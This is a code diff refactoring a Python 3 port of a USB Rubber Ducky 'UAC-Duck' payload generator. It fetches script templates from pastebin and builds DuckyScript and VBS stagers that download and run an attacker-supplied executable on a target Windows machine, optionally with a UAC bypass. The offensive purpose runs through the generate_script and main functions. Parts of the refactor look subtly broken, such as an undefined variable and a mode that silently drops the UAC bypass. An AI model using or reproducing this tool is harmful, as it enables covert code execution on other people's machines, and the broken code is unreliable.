@@ -13,7 +13,7 @@
 # WOULD NOT HAVE BEEN POSSIBLE FOR ME TO CREATE THIS VERSION.
 #
 # HIS ORIGINAL SCRIPT CAN BE FOUND AT HIS GITHUB ACCOUNT LOCATED BELOW.
-# https://github.com/SkiddieTech/UAC-D-E-Rubber-Ducky/blob/master/uac-duck.py
+# HTTPS://GITHUB.COM/SKIDDIETECH/UAC-D-E-RUBBER-DUCKY/BLOB/MASTER/UAC-DUCK.PY
 #
 # I HAVED USED HIS WORK AND RE-WRITTEN IT SO THAT IT CAN NOW BE RUN FOR
 # THOSE OF US WHO HAVE PYTHON 3.X.
@@ -41,8 +41,8 @@ DUCKY_PAYLOAD_URL = "http://pastebin.com/raw/apyPSqWs"
 def gen_bin_script(lang=None):
     """run_shell_command(str) -> return(None)
 
-    When the function is invoked runs a system command that turns
-    a ducky script into an inject.bin file.
+    When invoked runs a system command that creates
+    a ducky script inject.bin file.
     """
 
     sleep(1)
@@ -57,7 +57,7 @@ def check_file_ext(f, ext):
 
     Checks if a given file matches a given extenstion.
     Returns True if the file matches the extenstion
-    else return False.
+    otherwise returns False.
 
     :parameter
        -  f : The file that would be used to check.
@@ -81,25 +81,23 @@ def clear_pre_existing_files():
 def download_file(url, string=True):
     """download_file(str, bool(optional)) -> return(str)
 
-    Downloads a file from a given url. If error occurrs while
-    downloading an exception is raised.
+    Downloads a file from a given url. If an error occurrs
+    while downloading an exception is raised.
 
     :parameter
-        - url    : The url to download data from.
-        - string: String flag takes two arguments True or False. Default mode
-                  True.
+        - url    :The url containing the data to download from.
+        - string :The urlopen module default mode for storing
+                  downloaded data is bytes and not as strings.
 
-                  Becuase the urlopen downloads the data from the url in bytes.
-                  The string flag job is to determines whether the data should
-                  be decode as a utf-8 or not.
+                  The is where string flag comes in. When the
+                  flag is set to True it tells method to go
+                  ahead and decode the data into utf-8 because
+                  the data we are expecting is in the form of
+                  strings.
 
-                  If the string flag is set to True it tells the method that
-                  is okay to go ahead and decoded the returned value into a
-                  utf-8 format as we are expecting the downloaded material
-                  to be in string format.
-
-                  If the string flag is set to False it tells the function not
-                  to decode in utf-8 because the data downloaded is not a string.
+                  If the string flag is set to False it
+                  ells the method not to decode into utf-8
+                  because the data downloaded is not a string.
     """
     try:
         data = urlopen(url).read()
@@ -120,58 +118,92 @@ def replace_value(string, old, new):
     """
     return string.replace(old, new)
 
-def write_to_file(string, file_name='DuckyScript.txt', flag='a'):
-    """write_to_file(str, str(optional), str(optional)) -> return(None)
+def save(string, file_name, flag='a'):
+    """save(str, str, str(optional)) -> return(None)
 
-    Takes a string and saves it to a file. If the default file
-    name is not changed then any data saved will be saved to
-    the DuckyScript.txt file.
+    Takes a string and saves it to a file. If the flag 'a'
+    is set and file exist the data is added to end of the file.
+    If file does not exist then a new file is created and the
+    data stored.
 
     :parameter
-        - file_name: Default file name 'DuckyScript.txt'. If no
-                     name entered any data entered would be saved
-                     to this file.
-
+        - file_name: The name of the file the data would be saved to.
         -     flags: Takes three optional flags 'a', 'wb', 'w'.
                      flag 'a'  : appends data to an existing file. Default mode.
-                     flag 'wb' : writes to the data to a file in binary.
-                                 Any previous data will be over written.
-                     flag 'w'  : writes new data to file. Over rides any
-                                 existing data.
+                     flag 'wb' : writes data to a file in binary format.
     """
     with open(file_name, flag) as user_file:
         user_file.write(string)
 
-def gen_payload_duckyscript(uac_payload_url, file_name='update.vbs'):
-    """gen_payload_duckyscript(str, str(optional)) -> return(bool)
+def _gen_script(url, name_type, payload_url, name, executable_name, file_name):
+    """_gen_script(str, str, str, str, str,) -> return(None)
 
-    Generates a ducky script. Returns True if everything
-    went okay otherwise returns False.
+    A thin wrapper function that does most of the heavy lifting for
+    the functions 'gen_vbs_script' and 'gen_payload_duckyscript'.
 
-    :parameters
-        uac_payload_url: Url contains the link to the location of payload script.
-              file_name: Saves the script with the file name to the user
-                          hard drive. Default name update.vbs.
+    The function generates either a duckyscript or a vbs script
+    and saves it to the user hard drive. The script generated
+    depends on whatever function calls it.
+
+    :parameter
+      - url: The url to download the data from.
+      - name_type: The types to write to the file.
+                  Classified by three types: '[URL]', '[NAME]' and '[DRIVENAME]'
+
+      - payload_url: The url containing the payload.
+      - name: The name to save the payload once downloaded.
+      - executable_name: The name given to executable on the target machine.
+      - file_name: Then name to save the file on the users hard drive.
     """
-    if not uac_payload_url:
-        sys.exit('[-] Invalid Url!!')
-    elif not file_name.endswith('.vbs'):
-        file_name = 'update.vbs' # if the file does not end .vbs use default.
 
-    # generates ducky script payload.
-    powershell_script = replace_value(download_file(WINDOW_SCRIPT_URL),
-                                                   '[URL]',
-                                                    uac_payload_url.lower())
+    if payload_url:
+        script = replace_value(download_file(url), name_type, payload_url)
+        save(replace_value(script, name, executable_name), file_name)
+    else:
+        script = replace_value(download_file(url), name_type, name)
+        save(script, file_name)
 
-    write_to_file(replace_value(powershell_script, "[NAME]", file_name.lower()))
+def gen_vbs_script(url, name_type, payload_url, name, executable_name):
+    """gen_vbs_script(str, str, str, str) -> return(None)
+
+    Generates a vbs script.
+    :parameter
+        - url: The url to download the data from.
+        - name_type: The types to write to the file.
+                     Classified by three types: '[URL]', '[NAME]' and '[DRIVENAME]'
+
+       - payload_url: The url containing the payload.
+       - executable_name: The name given to executable on the target machine
+    """
+    if not executable_name.endswith('.exe'):
+        executable_name = 'update.exe'
+    if payload_url:
+        _gen_script(url, name_type, payload_url, name, executable_name, 'UAC-Duck-Payload.vbs')
+    else:
+        _gen_script(url, name_type, name=name, file_name=file_name)
+    print("\n[+] Payload UAC-Duck-Payload.vbs generated!")
+
+def gen_payload_duckyscript(url, name_type, payload_url, name, executable_name):
+    """gen_payload_duckyscript(str, str, str, str) -> return(None)
+
+    Generates a ducky payload script.
+
+    :parameter
+        - url: The url to download the data from.
+        - name_type: The types to write to the file.
+                     Classified by three types: '[URL]', '[NAME]' and '[DRIVENAME]'
+
+       - payload_url: The url containing the payload.
+       - executable_name: The name given to executable on the target machine
+    """
+    _gen_script(url, name_type, payload_url, name, executable_name, 'DuckyScript.txt')
     print('\n[+] Payload DuckyScript.txt generated!!')
-    sleep(1)
 
-def ducky_encoder(lang='GB'):
-    """ducky_encoder(str) -> return(None)
+def ducky_encode(lang='GB'):
+    """ducky_encode(str) -> return(None)
 
     The ducky_encode encodes the script as an inject.bin file.
-    If the language parameter is not False then the script is
+    If the language parameter is set to True then the script is
     encoded into that language else it is encoded as GB English.
 
     :parmeter:
@@ -199,8 +231,10 @@ def ducky_encoder(lang='GB'):
             if ans[0].lower() == 'n':
                 return
             elif ans[0].lower() == 'y':
+
                 print('[+] Beginning process please wait...')
                 gen_bin_script(None) # run command without language
+
                 if exists('inject.bin'):
                     print("[+] Successfully encoded script.")
                     break
@@ -212,89 +246,77 @@ def ducky_downloader():
 
     Downloads a ducky file and saves it to the user local drive.
     """
-    write_to_file(download_file(DUCKY_URL, False),'Duckencoder.jar', 'wb')
+    save(download_file(DUCKY_URL, False),'Duckencoder.jar', 'wb')
 
 def generate_script(online_version, uac_bypass, **kw):
     """generate_script(str, str, kw) -> return(None)
 
     A thin wrap function that works by checking whether
     the binary script url is either the online or
-    offline version. As well as whether to implement the
-    script with either a UAC bypass or not.
+    offline version. As well as whether to implement
+    the script with either a UAC bypass or not.
 
     :parmaters:
-       -online_version:  Takes two values True and False. True means
-                         use the online version and False the offline
-                         version.
-        - uac_bypass:    Takes two values. True means implement the UAC bypass.
+       -online_version:  Takes either a True or False.
+                         True means use the online version
+                         and False the offline version.
+
+        - uac_bypass:    Can be set to either True of False.
+                         When set to True the UAC bypass
+                         is implemented. And when set to
+                         False the UAC bypass is not implemented.
 
         kw(keyword arguments)
-           - payload_url : The raw UAC VBS Payload URL. Recommended URL
-                           pastebin/raw e.g. http://pastebin.com/raw/VBSPAYLOAD.
-
-           - payload_name: Your payload will be saved using this name.
-           - stager_name : The UAC VBS script will be saved using this name.
-           - drive_name  : The drive for the rubber ducky.
+           - payload_url : The is the url containing the payload.
+           - payload_name: The name associated witht the payload.
+           - stager_name : The name to associated with the
+                            UAC VBS script.
+           - drive_name  : The drive pointing to the rubber ducky.
     """
 
     if online_version and not uac_bypass: # online version without UAC bypass
-        gen_payload_duckyscript(kw['payload_url'], kw['file_name']) # Generate a Payload Ducky Script
-        
+        gen_payload_duckyscript(WINDOW_SCRIPT_URL,"[URL]",
+                                kw["payload_url"],
+                                "[NAME]",
+                                kw["executable_name"])
+
     elif online_version and uac_bypass: #  online version with UAC bypass
+        gen_vbs_script(DUCKY_PAYLOAD_URL,"[URL]",
+                       kw["uac_payload_url"],
+                       "[NAME]",
+                       kw["payload_name"])
 
-        # Generates a UAC-Duck-Payload.vbs payload
-        ducky_script = download_file(DUCKY_PAYLOAD_URL)
-        ducky_script = replace_value(ducky_script, '[URL]', kw['payload_url'])
-        write_to_file(replace_value(ducky_script, '[NAME]',
-                                    kw['file_name']),
-                                    'UAC-Duck-Payload.vbs')
-
-        print('\n[+] Payload UAC-Duck-Payload.vbs generated!')
+        gen_payload_duckyscript(WINDOW_SCRIPT_URL,"[URL]",
+                                kw["uac_payload_url"],
+                                "[NAME]",
+                                kw["uac_vbs_name"])
 
     elif not online_version and not uac_bypass: # offline version without UAC bypass
+        gen_payload_duckyscript(POWERSHELL_STAGER_URL,'[DRIVENAME]',
+                                kw["drive_name"],'[NAME]',
+                                kw["payload_name"] )
 
-        # Generates a payload Ducky Script and saves it to user local directory
-        power_shell_script = download_file(POWERSHELL_STAGER_URL)
-        power_shell_script = replace_value(power_shell_script,
-                                          '[DRIVENAME]',
-                                           kw['drive_name'])
-
-        write_to_file(replace_value(power_shell_script,
-                                    '[NAME]',
-                                     kw['payload_name'] ))
-
-        print('\n[+] Payload DuckyScript.txt generated!!')
-        print("[+] Place your {} on your rubber ducky and rename.".format(kw['payload_name']))
+        print("[+] Place your {} on your rubber ducky and rename.".format(kw["payload_name"]))
 
     elif not online_version and uac_bypass: # offline version with UAC bypass
 
-        # A two stage process. First a VBS stager will be generated
-        # Next a payload script is generated.
         print("""
         [+] Two stages will be implemented..
         [+] First a VBS stager would be generated...
         [+] Second a ducky payload ducky script would be generated..""")
 
         # creates a vbs stager.
-        vbs_payload_stager = download_file(PAYLOAD_VBS_URL)
-        write_to_file(replace_value(vbs_payload_stager,
-                                      '[NAME]',
-                                       kw['payload_name']))
+        gen_vbs_script(PAYLOAD_VBS_URL,'[NAME]',
+                       name=kw['payload_name'],
+                       executable_name=kw['stager_name'])
 
-        # creates a ducky script
-        power_shell_script = download_file(POWERSHELL_STAGER_URL)
-        power_shell_script = replace_value(power_shell_script,
-                                           '[NAME]',
-                                           kw['stager_name'])
-
-        write_to_file(replace_value(power_shell_script,
-                                    '[DRIVENAME]',
-                                     kw['drive_name']))
+        # create a ducky script
+        gen_payload_duckyscript(POWERSHELL_STAGER_URL,'[NAME]',
+                                kw['stager_name'],'[DRIVENAME]',
+                                kw['drive_name'])
 
         print("\n[+] VBS Stager {} + generated!!".format(kw['stager_name']))
-        sleep(1)
         print("[+] Payload DuckyScript.txt generated!!")
-        sleep(1)
         print("[+] Place the {} file and your {} on your rubber ducky ".format(kw['stager_name'],
                                                                                kw['payload_name']))
         sleep(1)
@@ -325,6 +347,7 @@ def menu():
     https://github.com/SkiddieTech/UAC-D-E-Rubber-Ducky/blob/master/uac-duck.py
 
     I haved used his work and re-written it so that it can now be run for
+
     those of us who have python 3.x.
 
     Welcome to the mad house..
@@ -354,60 +377,55 @@ def main():
 
     if choice == 1 or choice == 2:
         while True:
-            print('\n[+] Please enter your binary payload direct link URL( www.example.com/pay.exe):')
-            binary_payload_url = input('[ONLINE] >>> (binary_payload_url) : ').lower()
+            binary_payload_url = input('[+] Please enter your binary payload direct link URL(www.example.com/pay.exe): ')
             if check_file_ext(binary_payload_url, '.exe'):
                 break
 
-        print("\n[+] Enter a NAME to save your payload file as (Default: update.exe): ")
-        print('[+] This will be stored on the target machine: ')
-        file_name = input('[ONLINE]>>> (filename) : ')
+        print("\n[+] Enter a NAME to save your executable payload file as (Default: update.exe): ")
+        executable_name = input('[+] This will be stored on the target machine: ')
+        executable_name = 'update.exe' if not check_file_ext(executable_name, '.exe') else executable_name
 
         # choice 1 generates only a ducky script.
         if choice == 1:
-            # use default extenstion if does not end with exe
-            file_name = file_name if file_name.endswith('.exe') else 'update.exe'
-            generate_script(True, False, payload_url=binary_payload_url, file_name=file_name)
+            generate_script(True, False,
+                           payload_url=binary_payload_url.lower(),
+                           executable_name=executable_name.lower())
 
     # choices 2 generates a ducky script and VBS script.
     if choice == 2:
-        generate_script(True, True, payload_url=binary_payload_url, file_name=file_name)
 
-        print("\n[+] Please UPLOAD this .vbs file as raw text format to a webserver(Pastebin works great)")
-        sleep(1)
-        print('[+] Pastebin/RAW recommended Example http://pastebin.com/raw/VBSPAYLOAD)')
+        print("[+] Please UPLOAD this .vbs file as raw text format to a webserver(Pastebin works great).")
+        print('[+] Pastebin/RAW recommended Example http://pastebin.com/raw/VBSPAYLOAD).')
         print('[+] Please now enter your UAC VBS Payload URL you used for upload.\n')
 
-        uac_payload_url = input("ONLINE VERSION with UAC BYPASS >>> (UAC_VBS_payload_urL) : ")
-        print('\n[+] Now enter a NAME to save the UAC VBS Payload file as, default name (update.vbs): ')
-        name = input('[ONLINE] >>> (file_name) : ').lower()
-        gen_payload_duckyscript(uac_payload_url, name) if name else gen_payload_duckyscript(uac_payload_url)
+        uac_payload_url = input("ONLINE VERSION with UAC BYPASS >>> ")
+        uac_vbs_name = input('\n[+] Now enter a NAME to save the UAC VBS Payload file as. The default name is(update.vbs : ')
+
+        generate_script(True, True, payload_url=binary_payload_url, payload_name=executable_name,
+                        uac_payload_url=uac_payload_url, uac_vbs_name=uac_vbs_name.lower())
 
     elif choice == 3 or choice == 4:
 
         while True:
-            print("[+] Enter your binary payload name located on the drive e.g/ update.exe: ")
-            payload_name = input('[OFFLINE] >>> (payload_name) : ')
+            payload_name = input("[+] Enter your binary payload name located on the drive e.g/ update.exe: ")
             if check_file_ext(payload_name, '.exe'):
                 break
 
-        print("[+] Please input your Twin-Duck drive name e.g. backup. ")
-        drive_name = input('[OFFLINE] >>> (drive_name) : ')
-
+        drive_name = input("[+] Please input your Twin-Duck drive name e.g. backup. : ")
         msg = "[OFFLINE] Ducky D&E Blazing fast payload (Without UAC bypass) "
         if choice == 3:
             print(msg)
             generate_script(False, False, drive_name=drive_name, payload_name=payload_name)
         elif choice == 4:
-            print(replace_value(msg, '(Without UAC bypass)', '(With UAC bypass)' ))
 
+            print(replace_value(msg, '(Without UAC bypass)', '(With UAC bypass)' ))
             while True:
-                print("[OFFLINE] Please input your desired UAC VBS local file name(Example: update.vbs):")
-                stager_name = input('[OFFLINE] >>> (UAC_VBS_LOCAL_FILENAME) : ')
+                stager_name = input("Please input your desired UAC VBS local file name(Example: update.vbs): ")
                 if check_file_ext(stager_name, '.vbs'):
                     break
-            generate_script(False, True, payload_name=payload_name,
-                            drive_name=drive_name, stager_name=stager_name )
+
+            generate_script(False, False, payload_name=payload_name,
+                            stager_name=stager_name, drive_name=drive_name)
 
     elif choice == 5:
         sys.exit('[+] Thanks, for using ducky automation good bye!!!')
@@ -415,10 +433,10 @@ def main():
     while True:
         ans = input('[+] Would you like to encode your DuckyScript.txt into an inject bin file ("y/n/yes/no"): ')
         if ans[0].lower() == 'y':
-            ans = input('[+] Enter a language to encode the script with. Default GB: ')
 
+            ans = input('[+] Enter a language to encode the script with. Default GB: ')
             print('[+] Encoding DuckyScript.txt as inject bin file please wait...')
-            ducky_encoder() # encode ducky script to inject.bin file.
+            ducky_encode()
             break
         elif ans[0].lower() == 'n':
            break
